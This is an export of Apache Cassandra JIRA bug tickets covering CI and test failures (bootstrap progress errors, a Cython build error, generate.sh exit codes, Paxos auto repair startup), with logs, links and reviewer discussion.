From test_add_dc_after_mv_network_replication:
{code:java}
test teardown failure Unexpected error found in node logs (see stdout for full details). Errors: [[node4] 'ERROR [RMI TCP Connection(2)-127.0.0.1] 2022-11-14 18:17:12,075 RangeStreamer.java:716 - Discovered existing bootstrap data and cassandra.reset_bootstrap_progress is not configured; aborting bootstrap. Please clean up local files manually and try again or set cassandra.reset_bootstrap_progress=true to ignore. Found: [FetchReplica{local=Full(/127.0.0.4:7000,(-948011243982554585,-529333561071865027]), remote=Full(/127.0.0.1:7000,(-948011243982554585,-529333561071865027])}, FetchReplica{local=Full(/127.0.0.4:7000,(-1913296136443343226,-1608706368519466684]), remote=Full(/127.0.0.1:7000,(-1913296136443343226,-1608706368519466684])}, FetchReplica{local=Full(/127.0.0.4:7000,(-4645079874475487012,-4478384472891273586]), remote=Full(/127.0.0.1:7000,(-4645079874475487012,-4478384472891273586])}, FetchReplica{local=Full(/127.0.0.4:7000,(-8099177469676285022,-7854326460977230843]), remote=Full(/127.0.0.1:7000,(-8099177469676285022,-7854326460977230843])}, FetchReplica{local=Full(/127.0.0.4:7000,(4622442467519845550,4890578535898204379]), remote=Full(/127.0.0.1:7000,(4622442467519845550,4890578535898204379])}, FetchReplica{local=Full(/127.0.0.4:7000,(7380640855742145045,7647358289237905583]), remote=Full(/127.0.0.1:7000,(7380640855742145045,7647358289237905583])}, FetchReplica{local=Full(/127.0.0.4:7000,(-3745211865398425909,-3420377942455939864]), remote=Full(/127.0.0.1:7000,(-3745211865398425909,-3420377942455939864])}, FetchReplica{local=Full(/127.0.0.4:7000,(220943679196459793,240311054740010215]), remote=Full(/127.0.0.1:7000,(220943679196459793,240311054740010215])}, FetchReplica{local=Full(/127.0.0.4:7000,(-9089536355394438553,-8950368361212169132]), remote=Full(/127.0.0.1:7000,(-9089536355394438553,-8950368361212169132])}, FetchReplica{local=Full(/127.0.0.4:7000,(1270067479525650881,1319683862187611873]), remote=Full(/127.0.0.1:7000,(1270067479525650881,1319683862187611873])}]. Fully available: [(220943679196459793,240311054740010215], (714186444608726945,1270067479525650881], (1270067479525650881,1319683862187611873], (1681550687687262444,2205980652317166301], (2205980652317166301,2563203867868203845], (2989961503515581499,3271555240201161082], (3271555240201161082,3530568110946739344], (4622442467519845550,4890578535898204379], (4890578535898204379,5120572663460637982], (6233317147386468337,6523342873530347572], (6523342873530347572,6739595959157681279], (7380640855742145045,7647358289237905583], (7647358289237905583,7717741411673795355], (9105128289353134439,-9089536355394438553], (-9089536355394438553,-8950368361212169132], (-8612046773544495484,-8099177469676285022], (-8099177469676285022,-7854326460977230843], (-7272331012938171751,-6967841455392203442], (-6967841455392203442,-6763029350285018583], (-6327401896150750486,-5945690804458672440], (-5945690804458672440,-5918652702793856826], (-4883338404788320901,-4645079874475487012], (-4645079874475487012,-4478384472891273586], (-3745211865398425909,-3420377942455939864], (-3420377942455939864,-3406883856551240774], (-3406883856551240774,-2825075573495540613], (-2825075573495540613,-2389032451808813758], (-1913296136443343226,-1608706368519466684], (-1608706368519466684,-1571360519196462964], (-948011243982554585,-529333561071865027], (-529333561071865027,-495604637970883425], (-81762221173984640,220943679196459793]]. Transiently available: []']{code}
From test_resume_failed_replace:
{code:java}
test teardown failure Unexpected error found in node logs (see stdout for full details). Errors: [[replacement] 'ERROR [RMI TCP Connection(2)-127.0.0.1] 2022-11-14 19:20:32,569 RangeStreamer.java:716 - Discovered existing bootstrap data and cassandra.reset_bootstrap_progress is not configured; aborting bootstrap. Please clean up local files manually and try again or set cassandra.reset_bootstrap_progress=true to ignore. Found: []. Fully available: [(885982666796890695,1295688363270675145], (1295688363270675145,1546677791333802794], (1965355474244492353,2412926814142372739], (2412926814142372739,2715632714512817173], (3208875479925084325,3764756514842008261], (4176239723003619824,4700669687633523681], (4700669687633523681,5116307347205163561], (5766244275517518462,6327987693877144706], (6327987693877144706,6725310546225857497], (7385267571214561759,7750115326309337053], (7750115326309337053,7983731262171300585], (8363413023730675835,8728006182702825717], (8728006182702825717,9018031908846704952], (9018031908846704952,-9002425663581717273], (-8304696749155288652,-7904483433730108353], (-7904483433730108353,-7652223837007039389], (-7208654848920350363,-6846926749040059794], (-6846926749040059794,-6594847320078081172], (-5272981090736976346,-4777641977621814371], (-4777641977621814371,-4473152420075846062], (-3832712860834393106,-3451001769142315060], (-3451001769142315060,-3214731828932193028], (-2761212244494360294,-2388649369471963521], (-2388649369471963521,-2150390839159129632], (-925688907139582484,-330386538179183234]]. Transiently available: []']{code}",,e.dimitrova,jmckenzie,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17679,,,CASSANDRA-17679,,,,,,,,,,,,,,,,,,,,CASSANDRA-18001,,,,,,,,,,,,0.0,jmckenzie,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Nov 17 16:32:34 UTC 2022,,,,,,,All,,,,"0|z1c57c:",9223372036854775807,,,,,,,,Normal,,,,,,,,,,,,,,,,,,"14/Nov/22 21:09;e.dimitrova;CC [~jmckenzie] and [~marcuse] ;;;","15/Nov/22 03:33;jmckenzie;Simple addition of new -D or command-line params to allow them to proceed w/their prior logic. I'll tackle this tomorrow; sorry for the continued noise!

Turning out changing a default that introduces new exceptions when you bump into it makes a lot of tests unhappy. Note to self.;;;","17/Nov/22 16:00;jmckenzie;I think this was fixed [here|https://gitbox.apache.org/repos/asf?p=cassandra-dtest.git;a=commit;h=7f2b8eda5c52fb6f637aa7166e2d48cd34a64eec]. Are we still seeing these failures on recent runs?;;;","17/Nov/22 16:32;e.dimitrova;Well, it seems you made that commit two days ago when I also opened this ticket and Butler was still pointing to the breakage and trunk was failing for me. I think there was a race condition :D Butler shows clearly that those are not failing after 14th November so if we run them and they are fine I'd say we are good to close this one. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cqlshlib tests are j11 greedy,CASSANDRA-18039,13502120,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bereng,bereng,bereng,14/Nov/22 09:11,15/Nov/22 09:02,13/Jul/23 08:40,15/Nov/22 08:38,4.0.8,4.1,4.1-rc1,5.0,,,Test/dtest/python,,,,0,,[~e.dimitrova] found out cqlshlib test runs are j11 greedy. Despite j8 being specified if a JAVA11_HOME is present it will compile with j8 but ccm will effectively run them with j11.,,bereng,e.dimitrova,mck,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,bereng,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Nov 14 15:17:27 UTC 2022,,,,,,,All,,,,"0|z1c2qo:",9223372036854775807,,,,e.dimitrova,mck,,,Normal,,4.0.8,,https://github.com/apache/cassandra/commit/1df8174d67f67a75b5b17e2dff7f9838dc3e3ff6,,,,,,,,,See comments/PR,,,,,"14/Nov/22 09:31;bereng;If we're happy with the approach I will post up the rest of the branches:

||Branch||CI||
|[4.0|https://github.com/apache/cassandra/pull/2012]|[Jenkins|https://ci-cassandra.apache.org/job/Cassandra-trunk-cqlsh-t2/16/]|
|[4.1|https://github.com/apache/cassandra/pull/2009]|[Jenkins|https://ci-cassandra.apache.org/job/Cassandra-trunk-cqlsh-t2/15/]|
|[trunk|https://github.com/apache/cassandra/pull/2013]|[Jenkins|https://ci-cassandra.apache.org/job/Cassandra-trunk-cqlsh-t2/17/]|

Edit: 4.0 and trunk added

CC/[~mck] as you're familiar with these issues and env;;;","14/Nov/22 12:18;mck;+1;;;","14/Nov/22 13:12;bereng;4.0 and trunk added. Checked in console output j8 is effective and that the right branch is being tested.;;;","14/Nov/22 15:17;e.dimitrova;Thanks for the quick actions [~Bereng] . This fixes the cqlshlib tests +1 from me too;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cqlsh Cython failure on 4.0,CASSANDRA-18036,13501030,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bereng,bereng,bereng,11/Nov/22 06:33,11/Nov/22 23:07,13/Jul/23 08:40,11/Nov/22 10:03,4.0.8,,,,,,Test/dtest/python,Tool/cqlsh,,,0,,"Cython seems to be failing as [~e.dimitrova]  found out [here.|https://ci-cassandra.apache.org/job/Cassandra-4.0-cqlsh-tests/456/cython=yes,jdk=jdk_1.8_latest,label=cassandra/console]
",,bereng,mck,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-18028,CASSANDRA-18001,,,,,,,,,,,0.0,bereng,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Nov 11 09:53:41 UTC 2022,,,,,,,All,,,,"0|z1bw0o:",9223372036854775807,,,,mck,,,,Normal,,4.0.8,,https://github.com/apache/cassandra/commit/0f2fb1eeb3e1616b80bae9bae32b824c17de6ae5,,,,,,,,,See comments,,,,,"11/Nov/22 06:35;bereng;It seems an import was missing:

https://github.com/apache/cassandra/compare/trunk...bereng:cassandra:CASSANDRA-18028-4.0?expand=1
https://ci-cassandra.apache.org/job/Cassandra-trunk-cqlsh-t2/14/

CC/ [~mck] [~e.dimitrova];;;","11/Nov/22 09:42;mck;+1

Odd that it did not appear in https://ci-cassandra.apache.org/job/Cassandra-trunk-cqlsh-t2/10/cython=yes,jdk=jdk_1.8_latest,label=cassandra/console
{noformat}
13:57:07 Successfully installed Cython-0.27.3
13:57:07 + cd pylib/
13:57:07 + python setup.py build_ext --inplace
13:57:08 Compiling cqlshlib/copyutil.py because it changed.
13:57:08 [1/1] Cythonizing cqlshlib/copyutil.py
13:57:09 running build_ext
13:57:09 building 'cqlshlib.copyutil' extension
{noformat}

compared to the failure in https://ci-cassandra.apache.org/job/Cassandra-4.0-cqlsh-tests/456/cython=yes,jdk=jdk_1.8_latest,label=cassandra/console
{noformat}

16:22:28 Successfully installed Cython-0.27.3
16:22:28 [33mWARNING: You are using pip version 22.0.4; however, version 22.3.1 is available.
16:22:28 You should consider upgrading via the '/home/cassandra/cassandra/venv/bin/python -m pip install --upgrade pip' command.[0m[33m
16:22:28 [0m+ cd pylib/
16:22:28 + python setup.py build_ext --inplace
16:22:29 Compiling cqlshlib/copyutil.py because it changed.
16:22:29 [1/1] Cythonizing cqlshlib/copyutil.py
16:22:30 
16:22:30 Error compiling Cython file:
16:22:30 ------------------------------------------------------------
16:22:30 ...
16:22:30         while True:
16:22:30             try:
16:22:30                 readable, _, _ = select(self._readers, [], [], timeout)
16:22:30             except select.error as exc:
16:22:30                 # Do not abort on window resize:
16:22:30                 if exc[0] != errno.EINTR:
16:22:30                             ^
16:22:30 ------------------------------------------------------------
16:22:30 
16:22:30 cqlshlib/copyutil.py:205:29: undeclared name not builtin: errno
{noformat};;;","11/Nov/22 09:51;bereng;Search for 3.11 in https://ci-cassandra.apache.org/job/Cassandra-trunk-cqlsh-t2/10/cython=yes,jdk=jdk_1.8_latest,label=cassandra/console and you'll see the job was misconfigured;;;","11/Nov/22 09:53;mck;Oooh, mea culpa.

It is there is the job before, which was configured correctly to 4.0 :(
https://ci-cassandra.apache.org/job/Cassandra-trunk-cqlsh-t2/9/cython=yes,jdk=jdk_1.8_latest,label=cassandra/console ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
When generate.sh fails its rc=0,CASSANDRA-18032,13500945,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bereng,dcapwell,dcapwell,10/Nov/22 17:45,16/Jan/23 06:15,13/Jul/23 08:40,16/Jan/23 06:15,3.0.29,3.11.15,4.0.8,4.1.1,5.0,,CI,,,,0,,"{code}
$ ./generate.sh -a
Generating new config.yml file with low resources and LOWRES/MIDRES/HIGHRES templates from config-2_1.yml
./generate.sh: line 171: circleci: command not found
patching file ./config-2_1.yml
Hunk #4 succeeded at 1511 (offset 9 lines).
Hunk #5 succeeded at 1525 (offset 9 lines).
Hunk #6 succeeded at 1540 (offset 9 lines).
Hunk #7 succeeded at 1554 (offset 9 lines).
Hunk #8 succeeded at 1569 (offset 9 lines).
Hunk #9 succeeded at 1583 (offset 9 lines).
Hunk #10 succeeded at 1598 (offset 9 lines).
Hunk #11 succeeded at 1616 (offset 9 lines).
Hunk #12 succeeded at 1631 (offset 9 lines).
Hunk #13 succeeded at 1649 (offset 9 lines).
Hunk #14 succeeded at 1664 (offset 9 lines).
Hunk #15 succeeded at 1682 (offset 9 lines).
Hunk #16 succeeded at 1697 (offset 9 lines).
./generate.sh: line 177: circleci: command not found
patching file ./config-2_1.yml
./generate.sh: line 183: circleci: command not found
{code}",,adelapena,bereng,dcapwell,e.dimitrova,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17178,,,,,,,,,,,,0.0,bereng,,,,,,,,,,,,,,,,,,,,,,Low Hanging Fruit,User Report,,false,CASSANDRA-18007,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Jan 16 06:15:38 UTC 2023,,,,,,,All,,,,"0|z1bvi0:",9223372036854775807,,,,adelapena,bereng,,,Low,,4.1.0,,https://github.com/apache/cassandra/commit/69dfed3671144c019fb69793e3152b5a71d76421,,,,,,,,,See comments,,,,,"10/Nov/22 17:46;brandon.williams;//cc [~adelapena];;;","10/Nov/22 18:41;adelapena;Indeed we should immediately fail if [CircleCI local CLI|https://circleci.com/docs/local-cli/] is not installed. That tool is [needed by the {{-a}} option|https://github.com/apache/cassandra/blob/trunk/.circleci/readme.md#updating-the-config], and [also by {{{}-l{}}}, {{-m}} and {{-h}}|https://github.com/apache/cassandra/blob/trunk/.circleci/readme.md#switching-to-higher-resource-settings]. Possibly just use {{set -e}}.;;;","11/Nov/22 09:02;bereng;Tested locally. If we're happy with the approach I will put up the rest of the PRs;;;","11/Nov/22 11:42;adelapena;The PR adds that {{set -e}} option and also a check to verify that {{circleci}} is available.

As mentioned above, {{circleci}} command is only [needed by the {{-a}} option|https://github.com/apache/cassandra/blob/trunk/.circleci/readme.md#updating-the-config], and [also by {{{}-l{}}}, {{-m}} and {{-h}}|https://github.com/apache/cassandra/blob/trunk/.circleci/readme.md#switching-to-higher-resource-settings]. However, the proposed check doesn't verify which flags are run, so it prevents users from exclusively detecting tests and/or setting environment vars with, for example, {{{}.circleci/generate.sh -e REPEATED_UTESTS_COUNT=10{}}}.

I think we should do that check if any of the flags requiring {{circleci}} tool is present. That would be in practice almost identical to using {{set -e}} alone, just replacing the printed message.;;;","11/Nov/22 12:05;e.dimitrova;Thanks for handling this, can we wait not to commit it until we are done with the last 4.1 blockers, please? ;;;","11/Nov/22 12:43;bereng;Thx for the feedback. Yes I added a explicit check for the existence of circle so we could print a nice message. Also it appeared to me if you don't have it you wouldn't be using generate.sh at all. But I can change it and I can wait sure.;;;","09/Jan/23 10:32;bereng;I changed the PR to stick to a simple `set -e` to address [~adelapena] comments. If it looks ok and sbdy can +1 then I'll push the other PRs.;;;","09/Jan/23 11:12;adelapena;Looks good to me, +1;;;","10/Jan/23 11:22;bereng;Added the rest of the PRs and tested manually on all of them that on a missing circleci executable it fails properly.;;;","11/Jan/23 13:51;adelapena;+1;;;","12/Jan/23 06:17;bereng;Thx for the reviews!;;;","12/Jan/23 16:02;adelapena;I'm afraid that, as reported by [~stefan.miklosovic], the {{set -e}} is breaking the writing of env vars, including those used for test multiplexer. For example, if you run:
{code:java}
.circleci/generate.sh -l -e REPEATED_JVM_DTESTS=org.apache.cassandra.distributed.test.AuthTest
{code}
The {{REPEATED_JVM_DTESTS}} is not written:
{code:java}
Generating new config.yml file with low resources from config-2_1.yml

Detecting new or modified tests with git diff --diff-filter=AMR trunk...HEAD:
{code}
I suspect that [this subshell|https://github.com/apache/cassandra/blob/trunk/.circleci/generate.sh#L206-L211] is producing a not-zero output that immediately stops execution. That happens after the resource config has been written, but the automatic test detection fails and the writing of env vars is skipped.;;;","12/Jan/23 16:18;brandon.williams;A non-zero error code is definitely being returned even upon success now.;;;","12/Jan/23 17:28;adelapena;[Here|https://github.com/apache/cassandra/compare/trunk...adelapena:18032-trunk-followup] is a possible fix. 

The problem was that [the calls to grep inside this subshell|https://github.com/apache/cassandra/blob/trunk/.circleci/generate.sh#L206-L211] were returning 1 (not found) when the diff is empty, and the new {{set -e}} was interrupting the execution due to that not-zero return code. The solution is just suppressing that code, which can be done in multiple ways.;;;","13/Jan/23 06:08;bereng;Ah that's not nice. I tested a few things manually but not this one. New PRs:

- [3.0|https://github.com/apache/cassandra/pull/2089]
- [3.11|https://github.com/apache/cassandra/pull/2090]
- [4.0|https://github.com/apache/cassandra/pull/2091]
- [4.1|https://github.com/apache/cassandra/pull/2092]
- [trunk|https://github.com/apache/cassandra/pull/2093]

I tested manually you can set an env var on all branches. Thx [~adelapena] for the suggested fix.;;;","13/Jan/23 12:41;adelapena;Thanks for preparing the patches for the other branches, they seem identical as expected. I have tested them:
 * Without manually specified env vars nor new tests to be automatically detected.
 * With manually specified env vars and without new tests to be automatically detected.
 * Without manually specified env vars and with new tests to be automatically detected.
 * With manually specified env vars and with new tests to be automatically detected.

In all cases the written env vars are correct and the return code is zero, so let's commit the proposed fix.;;;","16/Jan/23 06:15;bereng;Take 2 committed: https://github.com/apache/cassandra/commit/f384e694825a2cd0a95debf30accb153f00e80b0;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fix starting Paxos auto repair,CASSANDRA-18029,13500890,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,smiklosovic,smiklosovic,smiklosovic,10/Nov/22 11:44,05/Jan/23 14:28,13/Jul/23 08:40,14/Nov/22 13:15,4.1-rc1,5.0,,,,,Legacy/Testing,,,,0,,"This test was not run in CI because of its name (not ending on Test) so it went undetected.

It fails locally as well (at least for me).",,benedict,bereng,e.dimitrova,mck,smiklosovic,,,,,,,,,,"smiklosovic opened a new pull request, #1994:
URL: https://github.com/apache/cassandra/pull/1994

   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;10/Nov/22 11:50;githubbot;600","smiklosovic closed pull request #1994: CASSANDRA-18029 4.1
URL: https://github.com/apache/cassandra/pull/1994


;05/Jan/23 14:28;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,1200,,,0,1200,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,smiklosovic,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Adhoc Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Nov 14 12:27:27 UTC 2022,,,,,,,All,,,,"0|z1bv5s:",9223372036854775807,,,,benedict,,,,Normal,,4.1-alpha1,,https://github.com/apache/cassandra/commit/19f55cf0b82f8c861be7e9616913961c80dfcd80,,,,,,,,,PaxosRepairTest2 renamed to PaxosRepair2Test and tests run,,,,,"10/Nov/22 11:50;smiklosovic;I fixed here what I could: [https://github.com/apache/cassandra/pull/1994]

One test is still failing, not sure what to do with it.

cc: [~benedict] ;;;","10/Nov/22 15:59;smiklosovic;I fixed all tests.

The most surprising fix consists of adding ""PaxosState.startAutoRepairs()"" to CassandraDaemon (and Instance), that oneliner just fixes ""paxosAutoRepair' test.

PaxosState.startAutoRepairs() is not called anywhere in the codebase. How are we actually starting autorepairs then?

I run them 500x  and one test method is flaky:

https://app.circleci.com/pipelines/github/instaclustr/cassandra/1561/workflows/62aecce3-7f29-4550-ab77-2c79922d80f4/jobs/7161/tests#failed-test-0;;;","10/Nov/22 16:01;smiklosovic;https://github.com/apache/cassandra/pull/1994;;;","10/Nov/22 16:03;smiklosovic;I added fixed version as 4.1-rc. It seems to me we are not starting auto repairs anywhere if I am not missing something here.;;;","10/Nov/22 16:11;brandon.williams;Why are you signalling this for review with a broken test?;;;","10/Nov/22 16:14;e.dimitrova;[~benedict] , this was the one we discussed in the Slack channel last week. Do you mind to review it, please? 

For reference - https://the-asf.slack.com/archives/CK23JSY2K/p1667504971163019?thread_ts=1667504727.263969&cid=CK23JSY2K;;;","10/Nov/22 16:15;e.dimitrova;{quote}Why are you signalling this for review with a broken test?
{quote}
Didn't he actually fix it in the last commit? I might have misunderstood;;;","10/Nov/22 16:18;smiklosovic;You know what, lets just move it to open :) I dont feel like I should fix a flaky test of a feature I am not familiar with at all.;;;","10/Nov/22 16:23;benedict;The changes look fine, and I don't see why it shouldn't be merged since it fixes things, even if it exposes a failing test?;;;","10/Nov/22 16:29;smiklosovic;Thanks [~benedict] , I suggest this ticket should be renamed to ""fix starting Paxos auto repair"" where we ship renamed tests supporting that feature, even one of them happens to be flaky. Not sure I have spare cycles to get into internals of this to come up with a fix.;;;","10/Nov/22 16:39;brandon.williams;Good suggestion, the title was indeed misleading, I've updated it.;;;","10/Nov/22 21:22;smiklosovic;fyi this is j8 pre-commit [https://app.circleci.com/pipelines/github/instaclustr/cassandra/1561/workflows/c8fae944-d876-4c2a-a8fd-05bb0b8a693b]

so there are two flakies

1) [paxosRepairHistoryIsntUpdatedInForcedRepair|https://app.circleci.com/pipelines/github/instaclustr/cassandra/1561/workflows/c8fae944-d876-4c2a-a8fd-05bb0b8a693b/jobs/7173/tests#failed-test-0]
2) [legacyPurgeRepairLoop|https://app.circleci.com/pipelines/github/instaclustr/cassandra/1561/workflows/c8fae944-d876-4c2a-a8fd-05bb0b8a693b/jobs/7173/tests#failed-test-1]
 

Please let me know if you want me to proceed to merge this and I ll be back on track. We will create tickets for these flakes. I am not familiar with Paxos and I am not able to evaluate if we can just accept that or it has some more serious consequences. Especially 2) is quite interesting.;;;","11/Nov/22 13:43;smiklosovic;[~benedict] could you please explicitly confirm here that adding starting of Paxos repairs in CassandraDemon here (1) is really the change which should be included in 4.1 and trunk? Just to be super clear here. I am wondering how was that test passing before when repairs were not starting. 

(1) https://github.com/apache/cassandra/blob/c323949c55d02d952121d5611975e075a049ec32/src/java/org/apache/cassandra/service/CassandraDaemon.java#L494;;;","11/Nov/22 13:51;benedict;Yes, that should be started, however it is not necessary for correctness. It simply keeps the backlog of uncommitted command state to a minimum.

Users switching to {{paxos_stage_purging: repaired}} rely on running regular/incremental/paxos repair for clearing {{system.paxos}} which is the more important job, this auto repair just means that the coordinated paxos repairs should finish a bit quicker.
;;;","11/Nov/22 14:03;mck;Given the explanation above I do not think this ticket should be an rc blocker, given we have no progress on how to fix the two flaky tests. (We should still try and get it in, there's only one or two other tickets we are currently waiting on…);;;","11/Nov/22 14:16;brandon.williams;This ticket isn't about fixing the tests, just starting paxos auto repair, which is done and I think is ready to commit now?  That should go into rc, but we can create tickets for the flaky tests that do not.;;;","11/Nov/22 14:20;benedict;Even if this ticket included running the tests that had been erroneously not running, some of which are flaky, it would be entirely weird to refuse its merge for some view on flaky tests. The tests _should be running_, and they are failing either way. The failing test metric is not there to be gamed, it's there to encourage good practices.;;;","11/Nov/22 14:30;brandon.williams;I don't disagree, we should fix the naming of the test so it runs.  I don't think we should block rc on them though unless you have time to fix them.;;;","11/Nov/22 14:31;benedict;No, I agree we shouldn't block rc.;;;","11/Nov/22 14:41;smiklosovic;What I got from this is that this should go in as is, with that extra line in CassandraDeamon, with renamed test class, fixed tests even some of them are flaky and we will not block rc and just create new tickets to make them stable. I will assign this to myself again and run the builds for trunk as well.;;;","12/Nov/22 09:03;smiklosovic;4.1 j11 pre-commit [https://app.circleci.com/pipelines/github/instaclustr/cassandra/1573/workflows/84394d1a-13a7-4de3-955c-a0d7cfed2681]
4.1 j8 pre-commit [https://app.circleci.com/pipelines/github/instaclustr/cassandra/1561/workflows/c8fae944-d876-4c2a-a8fd-05bb0b8a693b]
trunk j11 pre-commit [https://app.circleci.com/pipelines/github/instaclustr/cassandra/1572/workflows/e5b6b663-68c7-46dc-82df-206d907da949]
trunk j8 pre-commit [https://app.circleci.com/pipelines/github/instaclustr/cassandra/1572/workflows/c324f4ef-c9d1-4456-9f0d-9d4b4e2524c6]

trunk pr https://github.com/apache/cassandra/pull/2007
4.1 pr https://github.com/apache/cassandra/pull/1994
;;;","14/Nov/22 12:10;smiklosovic;I am moving this to ""needs commiter"", AFAIK this just needs to go to 4.1 and trunk. There is nothing in 4.0 like this. Two tests are flaky as expected.;;;","14/Nov/22 12:25;brandon.williams;I think [~benedict] may be +1 here already?;;;","14/Nov/22 12:27;benedict;Yep, LGTM +1;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
pylib cqlsh tests fail on cython,CASSANDRA-18028,13500878,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,mck,bereng,bereng,10/Nov/22 10:52,11/Nov/22 06:35,13/Jul/23 08:40,10/Nov/22 13:49,3.0.29,3.11.15,4.0.8,4.1,4.1-rc1,5.0,Test/dtest/python,Tool/cqlsh,,,0,,"Currently pylib/cqlsh tests _with_ cython where not being ran in [jenkins|https://ci-cassandra.apache.org/job/Cassandra-4.1-cqlsh-tests/181/]. Notice how cython yes and no run the same.

[~mck] managed to find where the flag was being dropped https://github.com/apache/cassandra-builds/pull/83

